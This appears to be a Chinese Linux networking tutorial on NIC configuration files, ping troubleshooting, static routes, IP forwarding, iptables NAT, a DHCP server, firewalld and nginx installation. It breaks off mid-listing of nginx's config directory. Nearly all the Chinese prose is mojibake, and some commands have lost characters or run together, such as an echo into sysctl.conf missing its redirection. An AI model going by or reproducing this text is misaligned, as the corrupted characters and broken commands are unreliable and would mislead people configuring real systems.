æ¡¥æ¥æ¨¡å¼çš„ipåœ°å€ï¼š192.168.2.119 ä½†æ˜¯å½“æˆ‘ä»¬æŸ¥çœ‹ç½‘å¡é…ç½®ä¿¡æ¯çš„æ—¶å€™ï¼Œä¼šå‘ç°é…ç½®æ–‡ä»¶åªæœ‰ifcfg-ens33ï¼Œå¦‚ä¸‹ æˆ‘ä»¬ç»™ens36ä¹Ÿå¼„ä¸ªé…ç½®æ–‡ä»¶ï¼Œéœ€è¦å¤åˆ¶ä¸€ä»½ifcfg-ens33é…ç½®æ–‡ä»¶ï¼Œç„¶åæ”¹åä¸ºifcfg-ens36ã€‚ ç„¶åä¿®æ”¹ifcfg-ens33é…ç½®ä¿¡æ¯ï¼š æ”¹ä¸ºå¦‚ä¸‹å†…å®¹ï¼šé…ç½®æ–‡ä»¶è·¯å¾„etcsysconfignetwork-scriptsifcfg-ens33 #é»˜è®¤é…ç½® TYPE=Ethernet # ç±»å‹ï¼šä»¥å¤ªç½‘ï¼Œæˆ‘ä»¬ç°åœ¨ç”¨çš„ç½‘ç»œéƒ½æ˜¯ä»¥å¤ªç½‘ï¼Œæ•°æ®é“¾è·¯åŸºå±‚éƒ½æ˜¯ä»¥å¤ªç½‘åè®®ï¼Œæ²¡æœ‰åˆ«çš„åè®®ã€‚1982å¹´ä»¥å¤ªç½‘ç»Ÿä¸€ äº†é“¾è·¯å±‚çš„åè®®. PROXY_METHOD=none # ä»£ç†æ–¹æ³•ï¼Œç›®å‰æ— ç”¨ï¼Œåˆ é™¤ BROWSER_ONLY=no # åªå…è®¸æµè§ˆå™¨ä½¿ç”¨ï¼Œæ²¡ç”¨ï¼Œåˆ é™¤ BOOTPROTO=dhcp # è·å–ipåœ°å€çš„æ–¹æ³•ï¼Œç›®å‰æ˜¯dhcpï¼Œæ”¹ä¸ºstaticï¼Œé™æ€æŒ‡å®šipåœ°å€ã€‚ DEFROUTE=yes # é»˜è®¤è·¯ç”±ï¼Œæ²¡ç”¨ï¼Œåˆ é™¤ IPV4_FAILURE_FATAL=no # ä»è¿™ä¸€è¡Œå¼€å§‹å¼€å§‹ï¼Œå¾€ä¸‹æ•°6è¡Œï¼Œéƒ½åˆ æ‰ IPV6INIT=yes IPV6_AUTOCONF=yes IPV6_DEFROUTE=yes IPV6_FAILURE_FATAL=no IPV6_ADDR_GEN_MODE=stable-privacy NAME=ens33 # åå­—æ”¹ä¸ºens36 UUID=15723721-cab7-40f6-bcee-4789906f8661 # è¿™æ˜¯å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œè¿™ä¸ªæ²¡ç”¨ï¼Œåˆ æ‰ DEVICE=ens33 ONBOOT=yes#ä¿®æ”¹åçš„é…ç½® TYPE=Ethernet #ä»¥å¤ªç½‘ç±»å‹ BOOTPROTO=static #dhcpè‡ªåŠ¨è·å– none,staticæ‰‹åŠ¨é…ç½® NAME=ens33 #ç½‘ç»œçš„åå­— DEVICE=ens33 #ç½‘å¡çš„åå­— ONBOOT=yes #å¼€æœºè‡ªå¯ IPADDR=192.168.61.150 #ipåœ°å€ NETMASK=255.255.255.0 #å­ç½‘æ©ç  # å…¶å®ä¸‹é¢ç½‘å¡å’Œdnséƒ½å¯ä»¥ä¸ç”¨é…ç½®ï¼Œå› ä¸ºæˆ‘æœ‰ä¸¤å—ç½‘å¡ï¼Œåªè¦æœ‰ä¸€å—ç½‘å¡æœ‰äº†ä¸‹é¢ç½‘å¡ç­‰çš„é…ç½®å³å¯ã€‚# GATEWAY=192.168.61.2 #ç½‘å…³# DNS1=223.5.5.5 #dns1# DNS2=180.76.76.76 #dns2 ipåœ°å€ä¹Ÿä¸æ˜¯éšä¾¿æŒ‡å®šçš„ï¼š linuxä¸Šç½‘ç»œåå­—å’Œç½‘å¡åå­—ç›¸åŒè€Œå·²ï¼Œæ²¡ä»€ä¹ˆã€‚ ç½‘å…³çš„ipåœ°å€ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯è™šæ‹Ÿæœºï¼Œè¦æ‰¾è¿™ä¸ªè™šæ‹Ÿæœºè‡ªå·±çš„ç½‘å¡ï¼Œçœ‹ç½‘å¡ä¿¡æ¯ä¸­æ‰¾åˆ°ç½‘å…³åœ°å€ï¼Œå› ä¸ºæˆ‘ä»¬ç¬¬ä¸€å—ç½‘å¡æ˜¯NATæ¨¡å¼çš„ï¼Œæ‰€ä»¥è¦æ‰¾VMnet8ï¼Œå¦‚ä¸‹ æ‰“å¼€è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨ï¼Œå¦‚ä¸‹ ç½‘å…³å°±æ˜¯192.168.61.2ã€‚ æˆ‘ä»¬åœ¨ä¿®æ”¹ä¸€ä¸‹ç¬¬äºŒå—ç½‘å¡ens36çš„ç½‘ç»œä¿¡æ¯ï¼š #ä¿®æ”¹åçš„é…ç½® TYPE=Ethernet #ä»¥å¤ªç½‘ç±»å‹ BOOTPROTO=static #dhcpè‡ªåŠ¨è·å– none,staticæ‰‹åŠ¨é…ç½® NAME=ens36 #ç½‘ç»œçš„åå­— DEVICE=ens36 #ç½‘å¡çš„åå­— ONBOOT=yes #å¼€æœºè‡ªå¯ IPADDR=192.168.2.110 #ipåœ°å€ NETMASK=255.255.255.0 #å­ç½‘æ©ç # å…¶å®ä¸‹é¢ç½‘å¡å’Œdnséƒ½å¯ä»¥ä¸ç”¨é…ç½®ï¼Œå› ä¸ºæˆ‘æœ‰ä¸¤å—ç½‘å¡ï¼Œåªè¦æœ‰ä¸€å—ç½‘å¡æœ‰äº†ä¸‹é¢ç½‘å¡ç­‰çš„é…ç½®å³å¯ã€‚ GATEWAY=192.168.2.1 #ç½‘å…³ # è¿™ä¸ªå°±çœ‹æˆ‘ä»¬ç‰©ç†æœºçš„ç½‘å…³ipå³å¯ï¼Œä¸ç®¡æœ‰å‡ å—ç½‘å¡ï¼ŒæŒ‡å®šä¸€ä¸ªç½‘å…³å³å¯ã€‚ DNS1=223.5.5.5 #dns1 DNS2=180.76.76.76 #dns2 ä¿®æ”¹å®Œé…ç½®æ–‡ä»¶ï¼Œé‡å¯ç½‘ç»œæœåŠ¡ç”Ÿæ•ˆ systemctl restart network # åˆšæ”¹ä¸ºé…ç½®ï¼Œé‡å¯å¯èƒ½ä¼šå¡ä½ä¸€ä¼šï¼Œæ²¡äº‹ï¼Œè‚¯å®šä¼šç”Ÿæ•ˆsystemctl stop NetworkManagersystemctl disable NetworkManager 3.10.3 ä¸Šä¸äº†ç½‘çš„æ’æŸ¥æ€è·¯3-1 xshellè¿ä¸ä¸Šçš„åŸå› ## æœ‰æ—¶å€™å¤§å®¶å¯èƒ½ä¼šä¸‹è½½ä¸€äº›å®‰å…¨å«å£«ä»€ä¹ˆçš„ï¼Œä¼˜åŒ–ä¸€ä¸‹è‡ªå·±çš„ç³»ç»Ÿï¼Œè®©ç³»ç»Ÿæ›´å¿«ä¸€äº›ï¼Œç»“æœå¯¼è‡´xshellè¿æ¥ä¸ä¸Šäº†.## æ£€æŸ¥ç½‘å¡æ˜¯å¦å¼€å¯äº† æ£€æŸ¥æœåŠ¡ï¼ŒDHCPæ˜¯ç”¨æ¥å‘æ”¾ipåœ°å€çš„ï¼ŒNATæ˜¯ç”¨æ¥æ§åˆ¶NATæ¨¡å¼è™šæ‹Ÿæœºä¸Šç½‘çš„ã€‚ è¿˜è¦æ£€æŸ¥å¦‚ä¸‹å‡ é¡¹ 1.æ£€æŸ¥è™šæ‹Ÿæœºçš„ç½‘ç»œé€‚é…å™¨ï¼Œæ˜¯å¦è¿æ¥ï¼Œæ˜¯å¦ä¸ºnatæ¨¡å¼2.æ£€æŸ¥VMware Network Adapter VMnet8ç½‘å¡æ˜¯å¦å¤„äºç¦ç”¨çŠ¶æ€3.VMnet8ç½‘å¡çš„ipåœ°å€æ˜¯å¦å’Œè™šæ‹ŸæœºåŒä¸€ä¸ªç½‘æ®µï¼Œæœ‰æ—¶å€™æ‰‹åŠ¨æŒ‡å®šå®ƒçš„ipåœ°å€ä¼šå†™é”™4.æ£€æŸ¥è™šæ‹Ÿæœºçš„ipæ˜¯å¦æœ‰æˆ–è€…æ˜¯å¦æ­£å¸¸ï¼Œlinuxä¸Šipåœ°å€å†²çªï¼Œä¼šå¯¼è‡´åè®¾ç½®è¿™ä¸ªipçš„ä¸»æœºæ‹¿ä¸åˆ°è¿™ä¸ªipåœ°å€ 3-2 xshellèƒ½è¿ï¼Œä½†æ˜¯ä¸Šä¸äº†ç½‘# å¦‚æœçœ‹åˆ°å¦‚ä¸‹æŠ¥é”™ï¼Œå¤šåŠæ˜¯GATEWAYå…³é”®å­—åç§°å†™é”™äº† [root@network02 ~]# ping baidu.com ping: baidu.com: æœªçŸ¥çš„åç§°æˆ–æœåŠ¡ [root@network02 ~]# ping 223.5.5.5 connect: ç½‘ç»œä¸å¯è¾¾#GATEWAYåœ°å€å†™é”™äº†ï¼Œæˆ–è€…ç½‘å…³è·¯ç”±å™¨æŒ‚äº† [root@network02 ~]# ping 223.5.5.5 PING 223.5.5.5 (223.5.5.5) 56(84) bytes of data.#èƒ½pingé€šå…¬ç½‘ipï¼Œpingä¸é€šåŸŸåï¼Œdnsåœ°å€æœ‰é—®é¢˜ [root@network02 ~]# ping www.baidu.com#[root@network02 ~]# vim /etc/resolv.conf #è¿™é‡Œå¯ä»¥ç›´æ¥ä¿®æ”¹DNSåœ°å€^C [root@network02 ~]# ping 223.5.5.5 PING 223.5.5.5 (223.5.5.5) 56(84) bytes of data. 64 bytes from 223.5.5.5: icmp_seq=1 ttl=128 time=14.4 ms 64 bytes from 223.5.5.5: icmp_seq=2 ttl=128 time=6.08 ms 3-3 ç‰©ç†æœºä¸Šä¸äº†ç½‘## ç¬¬ä¸€æ­¥ï¼šæ£€æŸ¥ç‰©ç†æ˜¯å¦æ­£å¸¸## ç¬¬äºŒæ­¥ï¼špingç½‘å…³## ç¬¬ä¸‰æ­¥: pingå…¬ç½‘ip## ç¬¬å››æ­¥ï¼šping www.baidu.com## tracert -d www.qq.com## ç¬¬äº”æ­¥ï¼šping è‡ªå·±æœåŠ¡å™¨ 3.11 é™æ€è·¯ç”±é¡¹ç›®3.11.1 ç¯å¢ƒå‡†å¤‡ ä¸‹é¢æˆ‘å…‹éš†å‡ºæ¥äº†ä¸‰ä¸ªè™šæ‹Ÿæœºï¼Œå¦‚ä¸‹ ç‰©ç†ç½‘ç»œå°±è®¾ç½®å¥½äº†ï¼Œæ¥ä¸‹æ¥å¼€æœºè®¾ç½®ipåœ°å€ã€‚ä¸ºäº†æ¼”ç¤ºå‡ºæ¥æ•ˆæœï¼Œæˆ‘ä»¬éƒ½ä¸ç»™è¿™ä¸‰å°ä¸»æœºè®¾ç½®ç½‘å…³åœ°å€ï¼Œåªé…ipåœ°å€å’Œå­ç½‘æ©ç ã€‚ç½‘å…³æ˜¯ä¼˜å…ˆçº§æœ€ä½çš„é™æ€è·¯ç”±ã€‚ test_01 test_02 ç¬¬ä¸€å—ç½‘å¡ï¼š ç¬¬äºŒå—ç½‘å¡ test_03 å¥½ï¼Œ02å¯ä»¥pingé€š01å’Œ03. é€šè¿‡01ç›´æ¥pingä¸€ä¸‹03ï¼Œè¯•è¯• pingä¸é€šï¼Œæ˜¾ç¤ºç½‘ç»œä¸å¯è¾¾ã€‚ ç°åœ¨çœ‹ä¸Šå»æˆ‘ä»¬çš„ä¸»æœºæ˜¯ä¸èƒ½è·¨ipåœ°å€æ®µè¿›è¡Œäº’ç›¸è®¿é—®çš„ï¼Œæˆ‘ä»¬è®¾ç½®ä¸€ä¸ªè·¯ç”±è§„åˆ™å°±å¯ä»¥äº†ã€‚ 3.11.2 è®¾ç½®é™æ€è·¯ç”±è§„åˆ™ç›´æ¥arpå¹¿æ’­å°±èƒ½è®¿é—®åˆ°çš„å«åšç›´è¿è·¯ç”±ï¼Œå¦‚ä¸‹ route -n å°±èƒ½æŸ¥çœ‹åˆ°ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¸»æœº01æƒ³è®¿é—®192.168.61.0 ç½‘æ®µçš„ä¸»æœºéƒ½æ˜¯ç›´æ¥å¯è¾¾çš„ã€‚ åˆšæ‰æˆ‘ä»¬ä½¿ç”¨ä¸»æœº01pingä¸»æœº03çœ‹åˆ°æŠ¥é”™ï¼Œç½‘ç»œä¸å¯è¾¾ï¼Œå°±æ˜¯å› ä¸ºä½ ping03ä¸»æœºçš„ipåœ°å€æ—¶ï¼Œä¸»æœº01å‘ç°ä½ è¦æ‰¾çš„ipåœ°å€ä¸åœ¨æˆ‘è¿™ä¸ªç½‘æ®µï¼Œå°±ä¼šè‡ªåŠ¨æŸ¥æ‰¾è·¯ç”±è¡¨çš„è®°å½•ï¼Œä¸Šé¢å°±æ˜¯è·¯ç”±è¡¨è®°å½•ï¼Œçœ‹ä¸åˆ°03ä¸»æœºæ‰€åœ¨ç½‘æ®µçš„è·¯ç”±ï¼Œæ‰€ä»¥æŠ¥é”™ï¼Œæ‰¾ä¸åˆ°ã€‚ ç»™01ä¸»æœºé…ç½®é™æ€è·¯ç”±ï¼š route add -net 172.16.1.0/24 gw 192.168.61.161# æ·»åŠ ä¸€æ¡é™æ€è·¯ç”±ï¼Œè®¿é—®172.16.1.0è¿™ä¸ªç½‘æ®µï¼Œé‚£ä¹ˆå…ˆè·³åˆ°192.168.61.161è¿™ä¸ªç½‘å…³ä¸Šï¼Œé€šè¿‡å®ƒå»è®¿é—®ï¼Œgwå°±æ˜¯è®¾ç½®ç½‘å…³çš„æ„æ€ï¼Œè¿™é‡Œå°±æ˜¯è®¾ç½®äº†ä¸€ä¸‹è·¯ç”±çš„ä¸‹ä¸€æ¬¡è·³è½¬åˆ°å“ªé‡Œ å¦‚ä¸‹ å…ˆpingä¸€ä¸‹02çš„ç¬¬äºŒå—ç½‘å¡çš„ipåœ°å€ï¼Œä¹Ÿå°±æ˜¯172é‚£ä¸ªç½‘æ®µçš„ å¯ä»¥pingé€šï¼Œçœ‹åˆ°02ä¸»æœºç»™æˆ‘å›å¤äº†æ•°æ®åŒ…ï¼Œè¿™æ˜¯å› ä¸º02ä¸»æœºæœ¬èº«çš„è·¯ç”±è¡¨ä¸­å°±æœ‰æˆ‘ä»¬01ä¸»æœºçš„ipåœ°å€æ®µï¼š å¯ä»¥é€šè¿‡ tcpdump -i ens33 -nn æ¥æŸ¥çœ‹ä¸€ä¸‹æ•°æ®åŒ…æœ‰æ²¡æœ‰åˆ°ï¼Œå…¶å®æ•°æ®åŒ…éƒ½æ²¡æœ‰åˆ°è¾¾03ä¸»æœºã€‚å› ä¸º02ä¸»æœºçš„ipåœ°å€å¹¶ä¸æ˜¯ 172.16.1.13 ï¼Œæ‰€ä»¥æ•°æ®åŒ…ä¸¢æ‰äº†ã€‚ä¹Ÿå°±æ˜¯è¯´02ä¸»æœºå…¶å®å¹¶æ²¡æœ‰å¸®æˆ‘ä»¬åšè½¬å‘ï¼Œæˆ‘ä»¬éœ€è¦é…ç½®ä¸€ä¸‹è½¬å‘æ‰è¡Œã€‚ 3.11.3 æ‰“å¼€è½¬å‘åŠŸèƒ½åœ¨02ä¸»æœºä¸Šæ‰“å¼€è½¬å‘åŠŸèƒ½ï¼š echo net.ipv4.ip_forward = 1 /etc/sysctl.confcat /etc/sysctl.confsysctl -p # è®©é…ç½®ç”Ÿæ•ˆ ç„¶åï¼Œæˆ‘ä»¬åœ¨02ä¸»æœºä¸ŠæŠ“ä¸ªåŒ… ç„¶åå†ä»01ä¸»æœºping03ä¸»æœºï¼Œçœ‹æ•ˆæœ çœ‹åˆ°æ•°æ®åŒ…åˆ°äº†02ä¸»æœºï¼Œ02ä¸»æœºç»™åšäº†è½¬å‘åˆ°äº† 172.16.1.13 ï¼Œä½†æ˜¯pingå¹¶æ²¡æœ‰æ”¶åˆ°å›åº”çš„æ•°æ®åŒ…ã€‚ è¿™æ˜¯å› ä¸º03ä¸»æœºä¸çŸ¥é“è¯¥æ€ä¹ˆå›ç»™01ä¸»æœºï¼Œçœ‹03çš„è·¯ç”±è¡¨ï¼š åœ¨03ä¸»æœºä¸Šä¹ŸåŠ ä¸Šä¸€æ¡é™æ€è·¯ç”±è§„åˆ™ route add -net 192.168.61.0/24 gw 172.16.1.12 å¦‚ä¸‹ å†é€šè¿‡01ä¸»æœºpingä¸€ä¸‹03ä¸»æœºï¼š å¯ä»¥pingé€šäº†ã€‚ è¿™å°±æ˜¯é€šè¿‡æˆ‘ä»¬è™šæ‹Ÿæœºæ¥æ¨¡æ‹Ÿäº†ä¸€ä¸‹é™æ€è·¯ç”±è§„åˆ™çš„è®¾å®šæ–¹å¼ã€‚ 3.11.4 æ€»ç»“ï¼š1ã€æ‰‹åŠ¨é…ç½®ip2ã€å…‹éš†è™šæ‹Ÿæœº3ã€æ·»åŠ é™æ€è·¯ç”±è§„åˆ™ route add -net 172.16.1.0/24 gw 192.168.20.12 route add -net 192.168.20.0/24 gw 172.16.1.124ã€è®¾ç½®æ•°æ®åŒ…è½¬å‘ echo net.ipv4.ip_forward = 1 /etc/sysctl.conf sysctl -p 5ã€systemctl restart network #é‡å¯ç½‘å¡æœåŠ¡å°±å¯ä»¥è¿˜åŸæ‰€æœ‰çš„é™æ€è·¯ç”±ï¼Œå¦‚æœä½ é…ç½®é”™äº†ï¼Œå°±å¯ä»¥é‡å¯ä¸€ä¸‹ 3.11.5 æ•°æ®åŒ…å‘é€åŸç†macåœ°å€åªæ˜¯ä¸ºäº†ç›¸åŒç½‘æ®µçš„ä¸»æœºé€šä¿¡ï¼Œipåœ°å€æ˜¯å®šä½ä¸»æœºçš„ã€‚ æˆ‘ä»¬æŠ“åŒ…çœ‹ä¸€ä¸‹ï¼Œæ¯”å¦‚é€šè¿‡01ä¸»æœºpingä¸€ä¸‹03ä¸»æœºï¼Œåœ¨02ä¸»æœºä¸ŠæŠ“ä¸¤å—ç½‘å¡çš„5ä¸ªæ•°æ®åŒ…åŒ…ï¼Œç„¶åæ”¾åˆ°01ä¸»æœºä¸Šå» åœ¨03ä¸»æœºä¸Šä¹ŸæŠ“5ä¸ªæ•°æ®åŒ…æ”¾åˆ°01ä¸»æœºä¸Š xshellè¿æ¥01ä¸»æœºï¼Œç„¶åæŠŠæ–‡ä»¶éƒ½æåˆ°ç‰©ç†æœºä¸Šï¼Œé€šè¿‡wiresharkæ‰“å¼€çœ‹ä¸€ä¸‹ï¼Œå°±çœ‹åˆ°macåœ°å€çš„å˜åŒ–äº†ã€‚ wiresharkæ‰“å¼€æ•°æ®åŒ…å°±çœ‹åˆ°çš„ipåœ°å€æ²¡æœ‰å˜åŒ–ï¼Œä¸€ç›´æ˜¯macåœ°å€çš„å˜åŒ–ã€‚ Ethernet II, Src: VMware_1f:4e:73 (00:0c:29:1f:4e:73), Dst: VMware_01:0e:9c (00:0c:29:01:0e:9c)Ethernet II, Src: VMware_01:0e:a6 (00:0c:29:01:0e:a6), Dst: VMware_ca:8c:81 (00:0c:29:ca:8c:81)Ethernet II, Src: VMware_01:0e:a6 (00:0c:29:01:0e:a6), Dst: VMware_ca:8c:81 (00:0c:29:ca:8c:81) 3.12 ä½¿ç”¨iptableså®ç°natä¸Šç½‘3.12.1 è®©ä¸»æœºä¸Šç½‘åˆšæ‰çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬çš„02ä¸»æœºå…¶å®ç°åœ¨åªæ˜¯åšäº†ä¸€ä¸ªæ•°æ®åŒ…è½¬å‘åŠŸèƒ½ï¼Œä½†æ˜¯å¹¶ä¸èƒ½ä¸Šç½‘ ä½†æ˜¯å½“æˆ‘æ·»åŠ ä¸€æ¡è·¯ç”±è§„åˆ™ï¼ŒæŒ‡å‘NATæ¨¡å¼çš„ç½‘å…³æ—¶ï¼Œå¦‚ä¸‹æŸ¥çœ‹ç½‘å…³ å¦‚ä¸‹é…ç½®è·¯ç”±è§„åˆ™ route add -net 0.0.0.0/0 gw 192.168.61.2 # 0.0.0.0/0è¡¨ç¤ºæ‰€æœ‰ç½‘æ®µæ‰€æœ‰ipåœ°å€ å¦‚ä¸‹ï¼Œå¯ä»¥pingé€šå…¬ç½‘ipäº† ä½†æ˜¯pingä¸åŒåŸŸåï¼Œå› ä¸ºDNSæ²¡æœ‰é…ç½®ï¼Œå¯ä»¥é…ç½®ä¸ªDNS vim /etc/resolv.conf ä¿å­˜é€€å‡ºï¼Œå†ping åŸŸåä¹Ÿå¯ä»¥pingé€šäº†ã€‚ 3.12.2 é…ç½®natè®©å…¶ä»–ä¸»æœºä¸Šç½‘æ¯”å¦‚æƒ³è®©03ä¸»æœºä¸Šç½‘ï¼Œæˆ‘ä»¬éœ€è¦ä¸¤æ­¥ï¼Œ1ã€åœ¨02ä¸»æœºä¸Šé…ç½®NATè§„åˆ™ 2ã€å°†03ä¸»æœºçš„ç½‘å…³ipæŒ‡å‘02ä¸»æœº 2-1 é…ç½®iptableçš„NATè§„åˆ™iptables -t nat -F # æ¸…ç©ºä¸€ä¸‹ä¹‹å‰çš„è§„åˆ™iptables -t nat -A POSTROUTING -s 172.16.1.0/24 -j MASQUERADE # é…ç½®NATè·¯ç”±å™¨-t nat ## æŒ‡å®šnatè¡¨-A POSTROUTINGé“¾ ## æ•°æ®åŒ…ç¦»å¼€çš„æ—¶å€™ï¼Œåšä¿®æ”¹-s ## æºipæˆ–è€…æºipæ®µ-j MASQUERADE ## æŒ‡å®šåŠ¨ä½œä¸ºï¼Œæ¨¡æ‹Ÿè·¯ç”±å™¨çš„å¤–ç½‘ip 03ä¸»æœºä¸Šæ¸…ç©ºä¸€ä¸‹ä¹‹å‰çš„è·¯ç”±è§„åˆ™ systemctl restart network ç»™03æ·»åŠ é™æ€è·¯ç”± route add -net 0.0.0.0/0 gw 172.16.1.12 ç»™03ä¸»æœºæ·»åŠ ä¸€ä¸‹DNSè§„åˆ™ vim /etc/resolv.confnameserver 223.5.5.5 ç„¶åå†pingä¸€ä¸‹ç™¾åº¦ï¼Œå¦‚ä¸‹ 3.13 Linuxçš„DHCPæœåŠ¡æ¥ä¸‹æ¥è®©æˆ‘ä»¬çš„linuxä¸»æœºæ›´åƒä¸€ä¸ªè·¯ç”±å™¨ï¼Œä¸€èˆ¬è·¯ç”±å™¨éƒ½å…·å¤‡dhcpæœåŠ¡ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç»™æˆ‘ä»¬çš„linuxä¸»æœºé…ç½®ä¸Šè¿™ä¸ªæœåŠ¡ã€‚ #1.å®‰è£…dhcp yum install dhcp -y#2.ä¿®æ”¹dhcpæœåŠ¡ç«¯çš„é…ç½®æ–‡ä»¶ vim /etc/dhcp/dhcpd.conf#......subnet 172.16.1.0 netmask 255.255.255.0 range 172.16.1.100 172.16.1.250; option domain-name-servers 119.29.29.29; option routers 172.16.1.12; default-lease-time 600; max-lease-time 7200;# subnetè¡¨ç¤ºå­ç½‘èŒƒå›´# rangeè¡¨ç¤ºåˆ†é…çš„ipåœ°å€èŒƒå›´# option routersè¡¨ç¤ºç½‘å…³# default-lease-timeè¡¨ç¤ºdhcpçš„é»˜è®¤ç§ŸæœŸ# max-lease-timeè¡¨ç¤ºæœ€å¤§ç§ŸæœŸ#3.å¯åŠ¨dhcpæœåŠ¡ç«¯systemctl start dhcpd.service systemctl enable dhcpd.service # è®¾ç½®å¼€æœºè‡ªå¯åŠ¨ æŠŠ03çš„ç½‘å¡ä¿¡æ¯æ”¹ä¸ºdhcpè‡ªåŠ¨è·å–ï¼Œåˆ é™¤ä¹‹å‰é…ç½®çš„ipåœ°å€å’Œå­ç½‘æ©ç ï¼Œé‡å¯ç½‘å¡æœåŠ¡ï¼Œç„¶åå†æ¥çœ‹03çš„ipåœ°å€ï¼Œå°±çœ‹åˆ°è‡ªåŠ¨åˆ†é…çš„ipåœ°å€äº†ã€‚ 3.14 Linuxé˜²ç«å¢™3.14.1 é˜²ç«å¢™å¼€å¯å’Œå…³é—­æŒ‡ä»¤systemctl start firewalldsystemctl status firewalldsystemctl stop firewalld æˆ‘ä»¬å¯ä»¥è‡ªè¡Œæ‰“å¼€é˜²ç«å¢™ï¼Œæ¯”å¦‚linuxçš„ï¼Œå¦‚ä¸‹ è¾“å…¥nginxï¼Œå¼€å¯nginxæœåŠ¡ï¼Œå¦‚ä¸‹ å¼€å¯é˜²ç«å¢™ä¹‹å‰æ˜¯å¯ä»¥è®¿é—®çš„ï¼Œå¦‚ä¸‹ å¼€å¯é˜²ç«å¢™ä»¥åå°±ä¸èƒ½è®¿é—®nginxæœåŠ¡äº†ï¼Œè¿™æ˜¯å› ä¸ºé˜²ç«å¢™é»˜è®¤åªèƒ½è¿æ¥22ç«¯å£ã€‚ 3.14.2 å…¶ä»–æŒ‡ä»¤# æŸ¥çœ‹å¼€æ”¾äº†å“ªäº›ç«¯å£firewall-cmd --list-ports# æŸ¥çœ‹å¼€æ”¾äº†å“ªäº›æœåŠ¡firewall-cmd --list-services# è¿˜å¯ä»¥æŸ¥çœ‹é…ç½®æ–‡ä»¶cat /etc/firewalld/zones/public.xml# çœ‹ä¸€ä¸‹sshæœåŠ¡çš„ç«¯å£cat /usr/lib/firewalld/services/ssh.xml 3.14.3 å¼€æ”¾æŸä¸ªç«¯å£# æ·»åŠ å¼€æ”¾ç«¯å£ firewall-cmd --zone=public --add-port=80/tcp --permanent # å¼€æ”¾80ç«¯å£ -- ## permanentè¡¨ç¤ºæ°¸ä¹…å¼€å¯ï¼Œå¦‚æœæƒ³ä¸´æ—¶å¼€å¯ï¼Œå°±ä¸è¦åŠ è¿™ä¸ªå‚æ•°äº†ã€‚ # å…³é—­å¼€æ”¾ç«¯å£ firewall-cmd --zone=public --remove-port=80/tcp # æ·»åŠ æœåŠ¡ï¼Œæ¯”å¦‚æ·»åŠ httpæœåŠ¡,httpé»˜è®¤ç«¯å£ä¸º80ï¼Œå¯ä»¥çœ‹é…ç½®æ–‡ä»¶ï¼šcat /usr/lib/firewalld/services/http.xml firewall-cmd --zone=public --add-service=http # åˆ é™¤æœåŠ¡ï¼š firewall-cmd --zone=public --remove-service=http # firewallæ‰€æœ‰æœåŠ¡çš„å®šä¹‰çš„ä½ç½® /usr/lib/firewalld/services/ 3.15 ikuaiä¸€äº›åŠŸèƒ½å’Œåè¯è§£é‡ŠAC ï¼š## è®¾å¤‡æ§åˆ¶APï¼š ## WiFiæ¥å…¥ç‚¹ 3.16 Nginxå®‰è£…# å¯ä»¥æ”¹ä¸€ä¸‹ä¸»æœºåï¼Œæ–¹ä¾¿æˆ‘ä»¬è®°å¿†ï¼šhostnamectl set-hostname web01 å®‰è£…æ–¹æ³•1ï¼š ä½¿ç”¨epelæºå®‰è£…# yum repolist #æŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„yumä»“åº“æœ‰å“ªäº›è½¯ä»¶åŒ… yum install epel-release -y # å®‰è£…yumçš„æ‰©å±•åŒ… yum install nginx -y systemctl start nginx.service systemctl enable nginx.service# netstat -lntup # æŸ¥çœ‹ç«¯å£å ç”¨æƒ…å†µ# å¯ä»¥çœ‹åˆ°nginxé»˜è®¤å ç”¨äº†80ç«¯å£# å®‰è£…å®Œä¹‹åï¼Œå¦‚æœæˆ‘ä»¬ç»§ç»­å®‰è£…ä¸€ä¸ªapacheçš„httpdï¼Œè¿˜æ˜¯å¯ä»¥å®‰è£…ä¸Šçš„# yum install httpd -y# ä½†æ˜¯å½“æˆ‘ä»¬å¯åŠ¨httpdçš„æ—¶å€™ä¼šæŠ¥é”™# systemctl start httpd# æŸ¥çœ‹å®ƒçš„çŠ¶æ€# systemctl status httpd # å¯ä»¥çœ‹åˆ°å¯åŠ¨å¤±è´¥äº†[root@web01 ~]# systemctl status httpd 3.16.1 Nginxçš„é…ç½®å’Œé…ç½®è¯´æ˜ä¿®æ”¹é…ç½®ä¹‹å‰ï¼Œä¸€èˆ¬éƒ½éœ€è¦æˆ‘ä»¬å¤‡ä»½ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼Œä»¥é˜²æ”¹é”™äº†ï¼Œé‚£ä¹ˆnginxä¹Ÿå¸®ä½ è€ƒè™‘åˆ°äº†ï¼Œæ‰€ä»¥æå‰ç»™æˆ‘ä»¬å‡†å¤‡äº†ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ï¼Œå¦‚ä¸‹ [root@web01 ~]# ll /etc/nginx/drwxr-xr-x 2 root root 6 11æœˆ 11 00:58 conf.ddrwxr-xr-x 2 root root 6 11æœˆ 11 00:58 default.d-rw-r--r-- 1 root root 1077 11æœˆ 11 00:58 fastcgi.conf-rw-r--r-- 1 root root 1077 11æœˆ 11 00:58 fastcgi.conf.default # fastcgi.confçš„å¤‡ä»½æ–‡ä»¶-rw-r--r-- 1 root root 1007 11æœˆ 11 00:58 fastcgi_params-rw-r--r-- 1 root root 1007 11æœˆ 11 00:58 fastcgi_params.default # fastcgi_paramsçš„å¤‡ä»½æ–‡ä»¶-rw-r--r-- 1 root root 2837 11æœˆ 11 00:58 koi-utf-rw-r--r-- 1 root root 2223 11æœˆ 11 00:58 koi-win-rw-r--r-- 1 root root 5231 11æœˆ 11 00:58 mime.types-rw-r--r-- 1 root root 5231 11æœˆ 11 00:58 mime.types.default # mime.typesçš„å¤‡ä»½æ–‡ä»¶-rw-r--r-- 1 root root 2336 11æœˆ 11 00:58 nginx.conf # nginxçš„ä¸»é…ç½®æ–‡ä»¶ï¼Œnginxæ¯æ¬¡å¯åŠ¨éƒ½ä¼šåŠ è½½å®ƒã€‚-rw-r--r-- 1 root root 2656 11æœˆ 11 00:58 nginx.conf.default # nginx.confçš„å¤‡ä»½æ–‡ä»¶-rw-r--r-- 1 root root 636 11æœˆ 11 00:58 scgi_params-rw-r--r-- 1 root root 636 11æœˆ 11 00:58 